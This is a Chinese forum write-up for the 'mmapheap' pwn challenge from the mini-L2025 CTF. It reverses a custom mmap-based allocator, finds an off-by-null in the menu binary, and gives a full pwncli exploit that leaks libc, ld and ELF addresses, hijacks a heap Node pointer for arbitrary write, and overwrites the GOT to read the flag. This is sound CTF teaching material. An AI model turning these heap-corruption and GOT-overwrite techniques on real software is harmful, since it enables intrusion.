
# [CTF] mini-L2025 mmapheap 非预期解

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2031038
- 抓取时间: 2026-11-01T22:09:43

## 0x0 前言

现在的新生赛可以说是越来越卷了，难的题已经能和国际比赛的低档题相当了。西电的新生赛虽然简单题不少，但是也有很多有价值的题。mmapheap这道题的预期解我也没看懂，出题思路是某个比赛的一道难题，旨在用`ld`作为攻击手段。但`ld`利用算是比较冷门的攻击方式，大多数题目不给`ld`，`ld`也不是唯一的解法（除非出题人精心设计），只有在各种house中有实际运用。本文用的解法不需要任何关于`ld`的利用（需要通过`ld`泄漏`elf`地址，不然没法做，但跟`ld`也没什么关系），后面等我能熟练利用`ld`的时候再补上`ld`的做法。

## 0x1 逆向分析

出题人自己编写了一个`libc`，用于实现内存分配和释放。

二进制文件保留了符号表，基本不用逆向也能看懂逻辑，只有结构体需要逆向。

```c
// vuln
struct Paper // sizeof=0x10
{
    _BYTE *buf;
    __int64 size;
};

// libmylib
struct Chunk // sizeof=0x10
{
    __int64 size;
    Chunk *next;
    _BYTE content[];
};

struct Node // sizeof=0x30
{
    Chunk *chead;
    __int64 cnt;
    void *start;
    void *end;
    Node *next;
    Node *pre;
};
```

`libmylib`的实现没啥漏洞（只不过没像`glibc`检查这么严格），先分析`vuln`的逻辑

`add`、`edit`、`delete`、`show`分别实现了增删改查，但是增和改的时候以下代码存在漏洞：

```c
buf[(int)read(0, buf, size)] = 0;
```

如果读入的大小和`buf`的大小一致，会导致1byte的溢出，也就是`off by null`。

`load`函数的逻辑是如果要读取的文件名包含`flag`就把`fake_flag`读入。这里我试过不能通过反斜杠绕过，毕竟这是道pwn题。

然后分析`libmylib`的逻辑。大多数函数只是和`glibc`功能一样的简易实现。这里主要分析堆的分配和释放。

堆分配：用`mmap`来向系统申请空间，每次申请`0x10000`，所有申请的空间通过双链表链接，新申请的空间插入到双链表的尾部。申请的空间会分割成一个一个`chunk`，在每次申请小的空间的时候才分割，每个`chunk`有一个`0x10`大小的头（见`struct Chunk`），`size`域最低位用于记录`Chunk`是否使用中，`next`指向下一个空闲的`Chunk`。

![](https://attach.52pojie.cn/forum/202505/13/091423iru2bbbvbscg2cka.jpg)

内存结构.jpg (97.23 KB, 下载次数: 0)

https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3Njc0OXxhN2UzMTRkNXwxNzkzNTcwOTgxfDE2ODA4NnwyMDMxMDM4&nothumb=yes

2025-5-13 09:14 上传

## 0x2 思路

菜单交互代码如下：

```python
from pwncli import *

elf = ELF("./vuln")
# io = gift.io = elf.process()
io = gift.io = remote('127.0.0.1', 34671)

libc = ELF("./libmylib.so")
context(log_level="debug", arch=elf.arch, terminal=["tmux", "sp", "-h"])
# ----

def add(idx, size, data=b"a"):
    sa(b"option:", b"1")
    sa(b"idx:", str(idx).encode())
    sa(b"size:", str(size).encode())
    sa(b"data:", data)

def edit(idx, data):
    sa(b"option:", b"2")
    sa(b"idx", str(idx).encode())
    sa(b"data:", data)

def free(idx):
    sa(b"option:", b"3")
    sa(b"idx:", str(idx).encode())

def show(idx):
    sa(b"option:", b"4")
    sa(b"idx: ", str(idx).encode())

def load(idx, filename):
    sa(b"option:", b"5")
    sa(b"idx: ", str(idx).encode())
    sa(b"filename:", filename)
```

`off by null`只能溢出一字节的0，要么溢出到`Chunk`要么溢出到`Node`。但是和`glibc`不一样，这里溢出到`Chunk`的`size`域作用不大，很难造成堆重叠。但是溢出到`Node`的话可以让`Node`的`chead`指向`chead`，那么其`size`大小跟`chead`地址就一致了，由于`size`很大，基本可以造成任意地址写。泄漏地址有点麻烦，需要将地址作为`size`写入一个可以访问到的`Chunk`里。但如果能控制`Node`的话就不难，因为可以通过改变`chead`指针所指向的地址将任意地址写入任意位置。

注意，远程有输入缓冲区大小限制，如果输入过大服务器连接会断开。所以不能写出类似`add(1,0xffc0,b'0'*0xffc0)`这样的代码，需要布局堆结构来造成堆溢出。以下是能溢出到下一个`node`的示例代码：

```python
add(0, 0x40)

add(1, 0xff80)

free(0)

add(0, 0x40) # 插入到链表尾

add(2, 0x30, b"a" * 0x30) # 溢出
```

`elf`地址可通过`vmmap`中查看，然后通过`search -p`来查找该地址在`ld`中的位置。

下面提供的`exp`非唯一解法，偏移通过调试来计算，期间我调试了很多遍，很多地方由于各种原因（如泄漏`elf`地址的时候破坏了`ld`、`got`表破坏了要修复等）需要通过调试来解决，请读者自行对每一步操作做调试。

## 0x3 `exp`

```python
from pwncli import *

elf = ELF("./vuln")
io = gift.io = elf.process()
# io = gift.io = remote('127.0.0.1', 34671)

libc = ELF("./libmylib.so")
context(log_level="debug", arch=elf.arch, terminal=["tmux", "sp", "-h"])
# ----

def add(idx, size, data=b"a"):
    sa(b"option:", b"1")
    sa(b"idx:", str(idx).encode())
    sa(b"size:", str(size).encode())
    sa(b"data:", data)

def edit(idx, data):
    sa(b"option:", b"2")
    sa(b"idx", str(idx).encode())
    sa(b"data:", data)

def free(idx):
    sa(b"option:", b"3")
    sa(b"idx:", str(idx).encode())

def show(idx):
    sa(b"option:", b"4")
    sa(b"idx: ", str(idx).encode())

def load(idx, filename):
    sa(b"option:", b"5")
    sa(b"idx: ", str(idx).encode())
    sa(b"filename:", filename)

add(5, 0xffc0) # node被控制
add(0, 0x40)
add(1, 0xff80)

load(0, b"./flag\n") # 后面会破坏ld，先让一些必要的函数的地址解析出来

free(0)

add(0, 0x40) # 插入到链表尾

add(2, 0x30, b"a" * 0x30) # 溢出

add(3, 0x30) # 将chunk地址写入0的content

show(0)

libc.address = u64_ex(r(6)) + 0x20040
ld_base = libc.address + 0x7000

success(f"{libc.address = :x}")
success(f"{ld_base = :x}")

elf_ptr = ld_base + 0x392e0

print(f"{elf_ptr = :x}")

add(9, 0xffa0)

add(10, 0x50380, p64(ld_base + 0x39380)) # 5的node被控制
add(11, 0x10)

edit(10, p64(elf_ptr))

add(12, 0xa0) # 将elf地址写入11的content

show(11)

elf.address = u64_ex(r(6)) + 0xb0

success(f"{elf.address = :x}")

edit(10, p64(elf.got.init_libmylib)) # 指向elf.got.init_libmylib

payload = fit(libc.sym.read, libc.sym.memset, libc.sym.r_open, libc.sym.r_open)
add(13, 0x30, payload)

edit(10, p64(libc.address - 0x1ff80)) # 将chead指回一个合法的Chunk

add(14, 0x30)

load(14, b"./flag\n")

show(14)

# --------
ia()
```

![](https://attach.52pojie.cn/forum/202505/13/090420jc8djqznc6rdr8jc.jpg)

运行截图.jpg (45.71 KB, 下载次数: 1)

https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3Njc0OHw2MGQ0Y2M0ZHwxNzkzNTcwOTgxfDE2ODA4NnwyMDMxMDM4&nothumb=yes

2025-5-13 09:04 上传
